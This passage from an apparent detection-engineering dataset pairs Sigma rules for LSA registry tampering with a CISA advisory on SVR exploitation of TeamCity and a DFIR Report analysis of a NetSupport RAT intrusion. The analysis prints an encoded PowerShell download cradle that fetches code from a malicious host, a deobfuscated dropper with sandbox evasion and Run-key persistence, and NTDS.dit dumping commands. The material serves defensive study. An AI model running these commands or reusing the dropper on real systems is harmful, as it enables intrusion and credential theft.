      "title": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
      "id": "28ac00d6-22d9-4a3c-927f-bbd770104573",
      "related": [
        {
          "id": "d6ce7ebd-260b-4323-9768-a9631c8d4db2",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/a8e3cf63e97b973a25903d3df9fd55da6252e564/atomics/T1112/T1112.md",
        "https://learn.microsoft.com/en-us/archive/technet-wiki/32905.remote-desktop-services-enable-restricted-admin-mode",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "frack113",
      "date": "2023-01-13",
      "modified": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa\\",
            "DisableRestrictedAdmin"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_lsa_disable_restricted_admin.yml",
    "id": "419"
  },
  {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
    "markdown": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally\n\n**Release Date**: December 13, 2023\n**Alert Code**: AA23-347A\n\n**Related topics**:\nNation-State Cyber Actors, Cyber Threats and Advisories, Securing Networks\n\n---\n\n## SUMMARY\n\nThe U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.\n\nSoftware developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations.\n\nTo bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions.\n\nDownload the PDF version of this report\nDownload the STIX XML\nDownload the STIX JSON\n\n---\n\n## THREAT OVERVIEW\n\nSVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence.\n\nIn April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies.\n\nIn this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers.\n\n---\n\n## TECHNICAL DETAILS\n\n### Initial Access - Exploitation\n\nThe SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server.\n\n### Host Reconnaissance\n\nInitial observations show the SVR used the following basic, built-in commands to perform host reconnaissance:\n\n- `whoami /priv`\n- `whoami /all`\n- `whoami /groups`\n- `whoami /domain`\n- `nltest -dclist`\n- `nltest -dsgetdc`\n- `tasklist`\n- `netstat`\n\n### File Exfiltration\n\nThe authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system:\n\n- `C:\\Windows\\system32\\ntoskrnl.exe`\n- SQL Server executable files\n- Visual Studio files\n\n### Interest in SQL Server\n\nBased on the review of the exploitation, the SVR also showed an interest in details of the SQL Server:\n\n- `powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\" -DestinationPath C:\\Windows\\temp\\1\\sql.zip`\n\n### Tactics Used to Avoid Detection\n\nTo avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software.\n\n---\n\n## MITRE ATT&CK TACTICS AND TECHNIQUES\n\n| Technique Title | ID | Use |\n| --------------- | -- | --- |\n| Gather Victim Network Information: Network Topology | T1590.004 | SVR cyber actors may gather information about the victim’s network topology that can be used during targeting. |\n| Exploit Public-Facing Application | T1190 | SVR cyber actors exploit internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access. |\n| Command and Scripting Interpreter: PowerShell | T1059.001 | SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files. |\n\n---\n\n## INDICATORS OF COMPROMISE\n\n### File IoCs\n\nGraphicalProton backdoor:\n\n- `01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732`\n- `34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E`\n\n---\n\n## MITIGATIONS\n\n- **Apply available patches** for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023.\n- **Monitor the network** for evidence of encoded commands and execution of network scanning tools.\n- **Require use of multi-factor authentication** for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.\n\n---\n\n## REFERENCES\n\n- Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders\n- Russian SVR Targets U.S. and Allied Networks",
    "sigma_rule": {
      "title": "Enable LM Hash Storage - ProcCreation",
      "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
      "related": [
        {
          "id": "c420410f-c2d8-4010-856b-dffe21866437",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "modified": "2023-12-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "\\System\\CurrentControlSet\\Control\\Lsa",
            "NoLMHash",
            " 0"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_reg_nolmhash.yml",
    "id": "421"
  },
  {
    "url": "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
    "markdown": "# NetSupport Intrusion Results in Domain Compromise\n\n**Category:** netsupport\n**Published on:** October 30, 2023\n\nNetSupport Manager is one of the oldest third-party remote access tools still currently on the market with over 33 years of history. This is the first time we will report on a NetSupport RAT intrusion, but malicious use of this tool dates back to at least 2016. During this report, we will analyze a case from January 2023 where a NetSupport RAT was utilized to infiltrate a network. The RAT was then used for persistence and command & control, resulting in a full domain compromise.\n\n## Case Summary\n\nThis intrusion began with an email delivered with a zip file containing a malicious Javascript file. Following email delivery, a user extracted and executed the Javascript file. The JavaScript code pulled down an obfuscated PowerShell script that was run in memory. The PowerShell script was responsible for deploying NetSupport onto the system along with ensuring the script was not running in a sandbox and establishing persistence using registry run keys.\n\nFive days after the deployment of NetSupport, the threat actor conducted preliminary reconnaissance by using various Windows utilities like whoami, net, and systeminfo. The threat actor then tried to re-enable a domain admin account that was disabled but appeared to have not succeeded.\n\nThis activity was followed several hours later by the installation of an OpenSSH server on the beachhead to facilitate persistence to the machine and network. In order to connect to the OpenSSH server the threat actors established a reverse SSH tunnel from the beachhead to their own server hosted on a VPS provider.\n\nUsing the previously mentioned reverse SSH tunnel to proxy connections through the beachhead host, the threat actors created a connection to the domain controller. Through the SSH tunnel the threat actors made use of Impacket's atexec.py to issue various discovery commands looking for privileged groups and domain joined computers.\n\nEight hours later, the threat actor changed firewall settings on a remote server and then began using Impacket's wmiexec.py to engage in further lateral movement. The threat actor moved cab files to the remote hosts using SMB and then expanded and ran them using wmiexec.py commands. The executed files were also NetSupport malware, however, these were configured to talk to a new command and control server. Once running, the threat actor then setup a scheduled task for persistence on these remote hosts. A few additional discovery commands were then issued on remote hosts before activity ceased.\n\nThe threat actors returned the next day deploying NetSupport on a domain controller. With this access they proceeded to dump the NTDS.dit database. After dumping it, they used 7-zip to compress the files. No specific exfiltration was observed but we assess with medium confidence that this archive was exfiltrated over the network via one of the existing command and control channels.\n\nA little less than an hour later, the threat actor moved to another domain controller and proceeded to again dump NTDS.dit. They also dropped and ran Pingcastle, an active directory auditing tool. While this was running, they used NetSupport to access a backup server to create a new account and add it to the local Administrators and Remote Desktop groups. Using that account, they logged in using RDP, proxying the connection from the beachhead host.\n\nAfter logging in, they dropped Netscan and a keygen. The threat actor checked on the status of Microsoft Defender and then proceeded to disable it. After disabling the protections, they dropped a renamed ProcDump binary and proceeded to dump LSASS on the domain controller, as well as a backup server.\n\nAfter this, the threat actor then issued a PowerShell command to search and dump Windows event ID 4624 logon events from the host. These were then zipped using 7-zip and then likely exfiltrated over existing command and control channels for further review. The threat actor also browsed file shares from the domain controller, opening several sensitive documents. Netscan was then moved to the domain controller and executed there. The threat actor issued a few more discovery commands using WMI, and then performed some clean up by killing running tasks like Netscan and the ssh proxy.\n\nThe final actions observed involved the threat actor dropping two Nim binaries on a domain controller. These Nim binaries were then used to attempt to create a backdoor user and elevate them to admin level permissions. We did not observe any backdoor account created after execution. After our own testing, we saw the tool failed to work and would return an error. After this, no further hands on activity was seen from the threat actor before they were evicted from the network.\n\n## Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, Havoc, etc. More information on this service can be found here.\n\nOur All Intel service includes private reports, exploit events, long term infrastructure tracking, clustering, C2 configs, and other curated intel, including non-public case data.\n\nIf you are interested in hearing more about our services or would like to talk about a free trial, please reach out using the Contact Us page. We look forward to hearing from you.\n\nInterested in a DFIR Report sticker, shirt, mug or other merchandise? Check out our shop.\n\n## Initial Access\n\nInitial Access began with a ZIP file delivered to a victim through email. This email campaign was observed in the wild occurring between late December 2022 through mid January 2023 according to Brad/@malware_traffic. An earlier sample was documented here using a USPS delivery theme with some overlap in command and control present between the intrusions. Once the ZIP file is extracted the user is presented with a JavaScript file.\n\n```image\nAlt: JavaScript File\nDescription: The image depicts an email client interface (Mozilla Thunderbird) showing an email titled 'Confirm Forest City account status' from a user named Gloria Z. Drewes. The email contains a message prompting the recipient to download an attached ZIP file named '98181772.zip'. Below the email, there is a window displaying the contents of the ZIP file, which includes a JavaScript file named '2326.js'. The visual elements highlight the process of initial access in a cyber intrusion scenario, illustrating the method of delivering malicious content via email.\nTranscription: |\n  From: Gloria Z. Drewes <no-reply@astragale-bien-etre.info>\n  Subject: Confirm Forest City account status\n  Date: Wed, 18 Jan 2023 21:56:25 +0300\n  \n  Dear Customer,\n  \n  I have sent you the documents regarding your account status, please download file.\n  \n  Best regards,\n  \n  Gloria Z. Drewes\n  2705 Woodrow Way, Livingston, TX, 77351\n  Phone: +1-(946)-895-5149\n  Fax: +1-(885)-526-4370\n  -----------------------------------------------\n  Distributor for USA: Forest City\n  VAT Reg. USA 489665771\n  \n  Attachment: 98181772.zip (7.8 KB)\n```\n\nOnce the user clicks on the JavaScript file, WScript will invoke the script.\n\n```image\nAlt: WScript Invocation\nDescription: The image displays a command line output showing the execution of a JavaScript file using WScript on a Windows system. It specifically shows the path to the WScript executable along with the path to the JavaScript file located in the Downloads directory. This detail is relevant as it highlights the method of execution in the context of a cyber intrusion scenario.\nTranscription: |\n  process.command_line\n  \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\XXXXXX\\Downloads\\2326.js\"\n```\n\n## Execution\n\n### NetSupport Deployment\n\nWScript was used to execute `2326.js` after the user ran the file from the zipped archive.\n\n```image\nAlt: WScript Execution\nDescription: The image is a screenshot displaying a table of events related to a security incident. It contains columns labeled 'event.provider', 'event.code', 'process.parent.command_line', and 'process.command_line'. Each row details the execution of commands, showing the processes involved, specifically 'WScript.exe' and 'cmd.exe', along with the corresponding command lines used to execute the scripts related to the NetSupport intrusion.\nTranscription: |\n  event.provider           event.code   process.parent.command_line                                      process.command_line\n  Microsoft-Windows-Sysmon 1            C:\\Windows\\Explorer.EXE                                       \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\****\\Downloads\\2326.js\"\n  Microsoft-Windows-Sysmon 1            C:\\Windows\\System32\\cmd.exe /c Powershell -nop -w hidden -ep bypaSS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\n```\n\nFollowing initial execution, `2326.js` invokes an encoded PowerShell command that reaches out to a hard-coded domain, `hxxp://1otal.com/index/index.php`, downloading and invoking the contents as PowerShell code.\n\n```\n\"C:\\Windows\\System32\\cmd.exe\" /c PowersheLl -nop -w hidden -ep bypaSS -enC SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\n```\n\n```image\nAlt: PowerShell Command\nDescription: The image displays a snippet of PowerShell code that suggests the use of Base64 decoding. The code shows a command for downloading a string from a specified URL, which is part of a malicious payload related to the NetSupport intrusion. The image highlights the phrase 'Base64 Decoded' in a red box, emphasizing the significance of decoding in the context of the malicious script.\nTranscription: |\n  SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQBvAHQAYQBsAC4AYwBvAG0ALwBpAG4AZABlAHgALwBpAG4AZABlAHgALgBwAGgAcAAiACkA\n```\n\nThe contents downloaded from `hxxp://1otal.com/index/index.php` take the form of an obfuscated PowerShell script responsible for the initial deployment of NetSupport. The full obfuscated contents of this script can be found on this link.\n\n```image\nAlt: Obfuscated Script\nDescription: The image displays a detailed HTTP request and response log for a GET request to '1otal.com'. It includes the method, status code (200 OK), headers (such as content type and server details), and a unique Body MD5 hash. Additionally, a snippet of obfuscated PowerShell code is shown, indicating the nature of the response. The layout is structured to provide clear visibility of the HTTP transaction details, making it informative for understanding the interaction with the malicious domain.\nTranscription: |\n  HTTP\n    Method: GET\n    Status code: 200\n    Hosts: 1otal.com\n    Request Headers: connection\n    Client Versions: 1.1\n    Response Headers: connection, content-type, date, server, transfer-encoding\n    Server Versions: 1.1\n    Body MD5s: ea36e629cf6c4c635de3d5df1ef653\n    libfile content type: text/plain\n    content-type Header: text/html; charset=UTF-8\n    server Header: nginx/1.22.0\n  \n  GET /index/index.php HTTP/1.1\n  Host: 1otal.com\n  Connection: Keep-Alive\n  \n  HTTP/1.1 200 OK\n  Server: nginx/1.22.0\n  Date:\n  Content-Type: text/html; charset=UTF-8\n  Transfer-Encoding: chunked\n  Connection: keep-alive\n  Vary: Accept-Encoding\n  \n  1F56\n    ${'4'+'g0o'} = [tYpE](\"{$3}{$0}{$4}{$7}{$9}{$5}{$2}{$1}{6}\" -f '.', 'resS', '.c', 'SysTEm.io', 'CoMp', 'On', 'f'+'ile', 'tE', 'Sys', 'M.IO.') ; ${'s`cr'`iptA`th'} = &(\"${0}{2}{1}\" -f 'spl', 'th', 'it-pa') -parent ${'4'+'g0o'}\n   \n  if (${'Sc`Rip`'path'} -match (\"{@{0}{1}\" -f 'a', 'v')) {exit}\n  if (${'s`cr'`ipT`path'} -match \"avg\") {exit}\n  if (${'Scr`ip'TpATH'} -match (\"{@{0}{1}\" -f 'sample')) {exit}\n  if (${'$SCRI`p`TaPTH'} -match (\"{@{0}{1}\" -f 'analy', 'sis')) {exit}\n  if (${'scri`pt`p'Ath'} -match (\"{@{0}{1}{2}\" -f 'm', 'al', 'wa')) {exit}\n  if (${'s`cr'`ipT`paH'} -match (\"{@{0}{1}\" -f 'dbox', 'san')) {exit}\n  if (${'sc`RiPtPa`TH'} -match (\"{@{1}{0}\" -f 'ir', 'v')) {exit}\n```\n\nThe following is the deobfuscated NetSupport deployment script. Note, this script has been cleaned up for brevity.\n\n```\n# Get Script Filename\n${ScriptPath} = Split-Path -parent ${MyInvocation}.MyCommand.Definition\n\n# Check Script Filename Agianst a Blacklist\nif (${ScriptPath} -match \"avast\") {exit}\nif (${ScriptPath} -match \"avg\")      {exit}\nif (${ScriptPath} -match \"sample\")   {exit}\nif (${ScriptPath} -match \"analysis\") {exit}\nif (${ScriptPath} -match \"malware\")  {exit}\nif (${ScriptPath} -match \"sandbox\")  {exit}\nif (${ScriptPath} -match \"virus\")    {exit}\n\n# Wrapper Function around Convert-StringToBinary\nfunction React (${Source}, ${Destination})\n{\n    Convert-StringToBinary -InputString ${Source} -FilePath ${Destination};\n}\n\n# Write a Base64 Encoded String to Disk\nfunction Convert-StringToBinary (${InputString}, ${FilePath})\n{\n    ${file}= ${InputString}\n\n    ${Data} =  [System.Convert]::FromBase64String(${file})\n    ${MemoryStream} = New-Object \"System.IO.MemoryStream\"\n    ${MemoryStream}.Write(${Data}, 0, ${Data}.\"Length\")\n    ${MemoryStream}.Seek(0,0) | Out-Null\n\n    ${DecompressedStream} = New-Object System.IO.Compression.GZipStream(${MemoryStream}, [System.IO.Compression.CompressionMode]::Decompress)\n    ${StreamReader} = New-Object System.IO.StreamReader(${DecompressedStream})\n    ${t} = ${StreamReader}.ReadToEnd()\n\n    ${ByteArray} =  [System.Convert]::FromBase64String(${t});\n    [System.IO.File]::WriteAllBytes(${FilePath}, ${ByteArray});\n}\n\n# The Install Function is invoked at the end of the script and will have the main execution logic.\nfunction Install\n{\n    # Registry Path Variables for Persistence, these are written to towards the end of the script.\n    [string] ${reg_key} = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n    [string] ${reg_name} = \"SoftwareUpdater\"\n\n    # Embedded File Variables\n    ${File1} = Gzip Compressed and Base64 Encoded presentationhost.exe\n    ${File2} = Gzip Compressed and Base64 Encoded client32.ini # NetSupport client configuration\n    ${File3} = Gzip Compressed and Base64 Encoded HTCTL32.DLL # Dependency DLL\n    ${File4} = Gzip Compressed and Base64 Encoded msvcr100.dll # Dependency DLL\n    ${File5} = Gzip Compressed and Base64 Encoded nskbfltr.inf # NetSupport component file\n    ${File6} = Gzip Compressed and Base64 Encoded NSM.ini # NetSupport component file which tells the installer which components to install\n    ${File7} = Gzip Compressed and Base64 Encoded NSM.lic # NetSupport license information file\n    ${File8} = Gzip Compressed and Base64 Encoded pcicapi.dll # Dependency DLL\n    ${File9} = Gzip Compressed and Base64 Encoded PCICHEK.DLL # Dependency DLL\n    ${File10} = Gzip Compressed and Base64 Encoded PCICL32.DLL # Dependency DLL\n    ${File11} = Gzip Compressed and Base64 Encoded remcmdstub.exe\n    ${File12} = Gzip Compressed and Base64 Encoded TCCTL32.DLL # Dependency DLL\n\n    # Generate Random Folder Name with 8 alphanumeric characters\n    ${RandF}=( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count 8 | &amp;('%') {[char]${_}}) )\n    ${FPath} =\"$env:appdata\\$Randf\"\n    mkdir ${FPath}\n\n    [string] ${ClientName} = \"presentationhost.exe\"\n    [string] ${remcmdstub} = \"remcmdstub.exe\"\n\n    React -source ${File1} -destination \"$FPath\\\"+\"$ClientName\"\n    React -source ${File2} -destination \"$fpath\\client32.ini\"\n    React -source ${File3} -destination \"$fpath\\HTCTL32.DLL\"\n    React -source ${File4} -destination \"$fpath\\msvcr100.dll\"\n    React -source ${File5} -destination \"$fpath\\nskbfltr.inf\"\n    React -source ${File6} -destination \"$fpath\\NSM.ini\"\n    React -source ${File7} -destination \"$fpath\\NSM.lic\"\n    React -source ${File8} -destination \"$fpath\\pcicapi.dll\"\n    React -source ${File9} -destination \"$fpath\\PCICHEK.DLL\"\n    React -source ${File10} -destination \"$fpath\\PCICL32.DLL\"\n    React -source ${File11} -destination \"$fpath\\$remcmdstub\"\n    React -source ${File12} -destination \"$fpath\\TCCTL32.DLL\"\n\n    # Establish Persistance in Run Key\n    New-ItemProperty -Path \"$reg_key\" -Name \"$reg_name\" -Value \"$fpath\\$clientname\"  -PropertyType \"String\"\n\n    # Start NetSupport\n    Start-Process \"$fpath\\$clientname\"\n\n    # Remove Files\n    ${F}= Get-Content \"$env:temp\\insghha4.txt\"\n    Remove-Item $env:TEMP\\*.ps1\n    Remove-Item ${F}\n}\n\n###########################################################\n## Begin Execution Here By Invoking the Install Function ##\n###########################################################\nInstall\n```\n\nThe NetSupport deployment script takes the following steps:\n\n1. Check the execution name of the script against a list of filenames, if any match the script will exit.\n   - The names checked include avast, avg, sample, analysis, malware, sandbox, and virus.\n2. All the required files for the NetSupport deployment are packaged inside the deployment script. All these files will be extracted into a randomly named folder under the users `%APPDATA%` directory.\n   - The randomly named folder will be a combination of 8 randomly generated letters and numbers, such as `%APPDATA\\8EDX3iOx` or `%APPDATA%\\KcEwrg3X`.\n3. The NetSupport executable will be added to the Registry Run Key for persistence.\n4. The NetSupport executable will then be invoked to begin execution.\n\n```image\nAlt: NetSupport Deployment\nDescription: The image is a flowchart illustrating the process of deploying NetSupport via a JavaScript file. It outlines the steps taken after the PowerShell script is invoked, including downloading the NetSupport deployment script, dropping files in the user's %APPDATA% directory, establishing persistence through the Registry Run Key, and launching the NetSupport executable. Key actions and their corresponding outcomes are visually represented with arrows connecting each step, providing a clear overview of the deployment sequence.\nTranscription: |\n  From JavaScript to NetSupport Deployment\n  ------------------------------------------------\n  PowerShell Invoked\n  - PowerShell Invokes NetSupport Deployment Script in Memory\n  - NetSupport Files Dropped Under Path in User's %APPDATA%\n  - NetSupport Persistence Established via Run Key\n  - NetSupport Launched\n  \n  http://total[.]com/index.php\n  - IEX (New-Object Net.Webclient). downloadstring(\"http://total.com/index.php\")\n  \n  Registry Entry:\n  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n  - C:\\Users\\[REDACTED]\\AppData\\Roaming\\eHNjgZ\\presentationhost.exe\n```\n\nThe NetSupport script creates all required files in the `%APPDATA%` folder.\n\n```image\nAlt: NetSupport Files\nDescription: The image displays a file directory structure showing various files located in the '%APPDATA%' folder of a Windows machine. The folder name is a randomly generated string 'eHNjqgZ', which aligns with the behavior described for the NetSupport deployment script. The list includes several DLL files, configuration files, and an executable named 'presentationhost.exe', indicating that these files are part of the NetSupport deployment package.\nTranscription: |\n  Name                    Type                      Size\n  client32.ini            Configuration settings    1 KB\n  HTCTL32.DLL             Application extension     321 KB\n  msvcr100.dll            Application extension     756 KB\n  nskbfltr.inf            Setup Information         1 KB\n  NSM.ini                 Configuration settings    7 KB\n  NSM.lic                 LIC File                  1 KB\n  pcicapi.dll             Application extension     33 KB\n  PICICHEK.DLL            Application extension     19 KB\n  PCICL32.DLL             Application extension     3,653 KB\n  presentationhost.exe    Application               110 KB\n  remcmdstub.exe          Application               63 KB\n  TCCTL32.DLL             Application extension     388 KB\n```\n\nIn addition, an entry was added to `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` for `presentationhost.exe` (NetSupport) to facilitate persistence on the machine.\n\n```image\nAlt: Registry Entry\nDescription: The image displays a table showing registry values on a Windows system. It includes columns for 'Value Name', 'Value Type', and 'Data', highlighting entries related to 'OneDrive' and 'SoftwareUpdater'. The 'SoftwareUpdater' entry is particularly significant as it indicates the path to the 'presentationhost.exe' executable located in a randomly named folder in the '%APPDATA%' directory, which is part of the NetSupport deployment process.\nTranscription: |\n  Values\n  | Value Name      | Value Type | Data                                                                        |\n  | --------------- | ---------- | --------------------------------------------------------------------------- |\n  | OneDrive        | RegSz      | \"C:\\Users\\<User>\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background |\n  | SoftwareUpdater | RegSz      | \"C:\\Users\\<User>\\AppData\\Roaming\\<RandomFolder>\\presentationhost.exe\"       |\n```\n\nLastly, the PowerShell script will finish by invoking the NetSupport executable directly.\n\n```image\nAlt: NetSupport Invocation\nDescription: The image displays a log entry related to a PowerShell command execution. It shows details from the Sysmon logs, specifically the channel 'Microsoft-Windows-Sysmon/Operational'. The log entry includes the event ID and the command line used during the execution of a PowerShell process. The command appears to be obfuscated and is running a script that eventually leads to the execution of 'presentationhost.exe' located in a randomized folder within the user's AppData directory. This context aligns with the NetSupport deployment described in the accompanying paragraph.\nTranscription: |\n  winlog.channel: Microsoft-Windows-Symon/Operational\n  winlog.event_id: 1\n  process.parent.command_line: Powershell -nop -w hidden -ep bypass -enC SQBFAFgAIAAAE4AZQB3ACATwB1AGoQAIABOAGU...\n  process.command_line: \"C:\\Users\\username\\AppData\\Roaming\\elHNjgzZ\\presentationhost.exe\"\n```\n\n### Batch Script Automation\n\nThe threat actor was observed making use of Batch scripts to automate some of their tasks, such as executing discovery programs, dumping credentials, and establishing persistence.\n\n```image\nAlt: Batch Script\nDescription: The image displays two batch script files, 'start.bat' and 'install.bat,' open in a code editor. The 'start.bat' script contains commands to change directory to 'C:\\ProgramData\\' and execute 'pingcastle.exe' with specific parameters, redirecting output to 'process.log.' The 'install.bat' script includes commands for generating SSH keys, setting file permissions using 'icacls,' and scheduling tasks with 'schtasks.exe' to run SSH server and key exchange processes at specified intervals.\nTranscription: |\n  start.bat\n  1  cd C:\\ProgramData\\\n  2  pingcastle.exe --healthcheck --level Full > process.log 2>&1\n  3  exit\n  \n  install.bat\n  1  @echo off\n  2  ssh-keygen -f %programdata%\\sshd\\config\\id_rsa -t rsa -N \"\"\n  3  icacls %programdata%\\sshd\\config\\keys\\id_rsa /inheritance:r\n  4  icacls %programdata%\\sshd\\config\\keys\\id_rsa /grant:r \"%username%\":\"(R)\"\n  5  icacls %programdata%\\sshd\\config\\id_rsa /inheritance:r\n  6  icacls %programdata%\\sshd\\config\\id_rsa /grant:r \"%username%\":\"(R)\"\n  7  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Server\" /rl highest /tr \"%programdata%\\sshd\\sshd.exe\"\n  8  schtasks.exe /create /sc minute /mo 1 /tn \"SSH Key Exchange\" /rl highest /tr \"%programdata%\\sshd\\ssh.exe\"\n  \n  ntds.bat\n  1  powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\ProgramData\\ntdsutil' q q\"\n```\n\n## Persistence\n\nDuring the beginning stages of the intrusion, the NetSupport deployment script was used to establish persistence using the Run key under the user registry hive. For more details, see the Execution section.\n\n```image\nAlt: Registry Persistence\nDescription: The image displays a section of PowerShell code related to establishing persistence in a Windows environment. It shows the definition of registry path variables for persistence, specifically targeting the 'Run' key in the Windows registry. The code includes commands to create a new item property in the specified registry path, which is likely used to automatically execute a program during system startup.\nTranscription: |\n  # Registry Path Variables for Persistence, these are written to towards the end of the script.\n  [string] ${reg_key} = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n  [string] ${reg_name} = \"SoftwareUpdater\"\n  \n  # Establish Persistence in Run Key\n  New-ItemProperty -Path \"$reg_key\" -Name \"$reg_name\" -Value \"$fpath\\$clientname\" -PropertyType \"String\"\n```\n\nSince the deployment script was PowerShell based, the source process of the registry activity will appear as `powershell.exe`.\n\n```image\nAlt: PowerShell Registry\nDescription: The image displays a structured log entry related to a registry event in a cybersecurity context. It includes columns such as 'event.provider,' 'event.code,' 'event.action,' 'process.executable,' 'registry.path,' 'registry.value,' and 'log.event_data.Details.' Specific details indicate that a registry value was set, pointing to a scheduled task or persistence mechanism involving 'powershell.exe' and a registry path associated with software execution on a Windows system.\nTranscription: |\n  event.provider: Microsoft-Windows-Symon\n  event.code: 13\n  event.action: Registry value set (rule: RegistryEvent)\n  process.executable: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  registry.path: HKU\\S-1-5-21-xxxxxxxxxx-xxxxxxxxxx-xxxxxxxxxx-xxxx\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SoftwareUpdater\n  registry.value: SoftwareUpdater\n  